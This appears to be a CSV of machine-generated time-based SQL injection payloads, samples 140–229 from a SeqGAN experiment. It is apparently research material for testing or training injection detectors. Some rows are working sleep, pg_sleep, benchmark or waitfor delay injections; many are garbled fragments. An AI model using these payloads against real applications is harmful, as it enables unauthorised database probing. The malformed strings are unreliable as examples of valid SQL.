label,payload,family,payload_type,method,run_id,sample_index
attack, )    or sestse   <>    )     )   and   (  select from pg_sleep  (  'isintegratedsecurityonly'   )    )    ar yemd5  (  __TIME__TIME__  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,140
attack,; (   waitfor el d where )  9862 ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,141
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,142
attack,1%'   )    )    aseb,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,143
attack,1'  )   waitfor delay pg_sleep  (  _  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,144
attack,""" or sleep  (  5   )    )     )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,145
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'pr    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,146
attack,"or pg_sleep  (  __TIME__TIMo"" like ""crrprmhry  )    asarvelelt.cl",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,147
attack,pg_sleep  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,148
attack,1 rn and 4240  =    ) is dufrl    vluf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,149
attack,pg_sleep  (  0x4c4d6142   )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,150
attack,waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,151
attack,1'   )    )    ase--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,152
attack,""" or 'fdgq'  =  6223 rlike sleep  (  10000000,MD5  (  select5   )    )     )  sdo  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,153
attack,1'   )    )    ararel,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,154
attack,"1"" rlike sleep  (  5  )   and ""vnens from dualsleepu ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,155
attack,"1%""   )    )    yf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,156
attack,1   )    aas,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,157
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,158
attack,"select benchmark  (  5000000,md5  (  5000000,md5  (   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,159
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,160
attack,"select 6784  =  )  2657 rlike sleep  (  5000000,md5  (  _TIME__  )   and   (  5   )    )     )  srm' waitfor delay '  )    )     )  sremq  )    and   (  '%'  =  7260 cncnex,r where 7739  =  7908 rlike sleep  (  substring   (    (   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,161
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""ryve'  =  'ce""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,162
attack,1   )    )    ase pdidcnnddmnnsusotapd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,163
attack,"1'||  (  select 'tww""  =  ""f",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,164
attack,""";""%""  =  )    and 6969  =  2657 el",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,165
attack,0wemver'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,166
attack,1%'   )    )     )e;waitfor sleep  (  5  )   )   d   d   ;waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,167
attack,"waitfor delay ((  3114,1  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,168
attack,1   )    as )    baigw where 6456 from 2679  =  sleep  )   and 4240duvlikef,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,169
attack,""" waitfor delay '0:0:5' and ""  (  0x544d5a4c   )    )   """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,170
attack,"select 8466  =  benchmark  (  10000000,1  )   _  )   d   and   (  select * from   (  5   )     )   aser  )   asrlikwaitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,171
attack,",waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,172
attack,1%' and   (  select * from   (  select  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,173
attack,"1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wmfot""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,174
attack,1 or pg_sleep  (  9558  =  6618,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,175
attack,"1%"" andw   (    )     )  sddo  )   and and   z  (  5   )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,176
attack,' from psvsr'  =  ''  =  'twy,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,177
attack,1  )   waitfor delay pg_sleep  (  5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,178
attack,select 6969 from   (  select * frombmd5  (  5   )    )     )  srmq  )       (    )    and   (  select sleep  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,179
attack,"1%""   o)    )    asememydpu",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,180
attack,"1%""   )    )    eefp where 7165  =  9862 or 8514  =  6784,sleep  (  __TIME__TIME__  )=  )   and du el 6793 sleep  (  5   )    )     )  srmand    (sddo  )     )  ;50  )   d   waitfor delay '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,181
attack,   )    )     )   se--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,182
attack,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrjog'  =  'vf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,183
attack,"1%"" and benchmark  (  5  )   mds where 8507 rlike sleep  (  5   )    )     )  pmd5  (  __TIME__  )    > 9443 9443  (  1915  6866  =  'mfzn",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,184
attack,1  )   or   (  5   )    )     do  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,185
attack,"select sleep  (  10000000,MD5  (  5   )    )       )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,186
attack,pg_sleep  (  5   )    )     )jmq  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,187
attack, and pg_sleep  (  __TIME__  )   d   )    <> 9862 sleep  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,188
attack,"1%""  )   where 6767   pg_sleep  (  5uudoion5  (  5  )   md5  (  5;rno  and and   )   and  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,189
attack, )  )   ;waitfor benchmark  (  'isintegratedsecurityonly'   )    )   waitfor sleep  (  5   )    )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,190
attack,"1%""   )    )    yse   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,191
attack,select pg_sleep  (  select  )   and rlike sleep  (  5  )   and   (  select 50  =  when   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,192
attack,"1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jag""  =  ""fg""  =  ""cfctrar",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,193
attack,"1"" waitfor delay '0:0:5' and ""d'  =  'fq7165   )    ar    )    aselb",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,194
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twyvmf"" like ""ave",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,195
attack, )   or pg_sleep  (  benchmark  (  5   )    (     )   _eTIME__  )    band kernoxrnnd'  =  '  )   and (  select like 'fd5  (  _TIME__TIME__  )    (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,196
attack,select sleep__TIME__TIME__TIM5  )    )     )nfzjararveyq  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,197
attack,select sleep  (  5   )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,198
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmyb'  =  'x'  =  '' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,199
attack,"1%""   )    )    ase plikareel",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,200
attack,", if 7165  =  2657 and   (  select  =  apr  )   as du where 2335 rlike sleep  (  5000000,md5  (   dsion  )   as dnjwdo  ,waitfor delay pg_sleep  (  5000000,md5  (  5   )    )    asy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,201
attack,"1""  )   as where 77397165  )   waitfor delay sleep  (  5000000,md5_TTr'  =  'jrt'  =  'ioertfarty'  =  'dremmy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,202
attack,""",waitfor e delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,203
attack, benchmark  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,204
attack,select sleep  (  0x544d5a4c   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,205
attack,  )   ;(  (  select   )    )     )  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,206
attack,5   )    apaltelbcpr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,207
attack,select sleep  (  5   )    )    )     )  syq ru   )    )   aso,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,208
attack,1   )    )     ) or pg_sleep  (  5   )    )     )  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,209
attack,select pg_sleep  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,210
attack,"1 or pg_sleep  (  __TIME__Trgrjrarar""  =  ""ioact__rmhrpulr'  =  'ar  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,211
attack,1  )   or sleep  (  __TIME__  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,212
attack," )    (  select 9862 4240 from pg_sleep  (  5000000,md5  (   sevtsr""  =  ""erveyevrmyb",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,213
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baiaia",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,214
attack,"1'   )    )    or sleep  (  5000000,md5  (  5   )    ) ,#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,215
attack,"1""  )   and   (  'dcys'   (  5   )    )     )  vey  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,216
attack,select sleep  (  5   )    )     )  vjasrlikelt__TIMop,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,217
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,218
attack,1'   )    )    or benchmark  (  _ onjzndpddmq,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,219
attack,1' waitfor delay '0:0:benchmark5  (  substring   (    (  select *dusrveubxrvl,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,220
attack,"""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,221
attack,", if not 50  )   as d  6223 and elt  =  2840 elt  (  sleep  (  'isintegratedsecurityonly'   )    )    and 8140(  5   )    )     )  srmq  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,222
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nondfqgon",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,223
attack, (  select 8466  =  3885   and   (  select pg_sleep  (  5   )    )     )       s xvbrrn,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,224
attack,or information_schema0us where 6223  sleep  )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,225
attack,'   )    )     )   (  6618,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,226
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  ''  =  'wIwheretar,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,227
attack,1 or 8514  =  sleep  (  __TIME__  )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,228
attack,$  0x544d5a4c   )    )    or   (  5  )   sdmarapermy,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,229
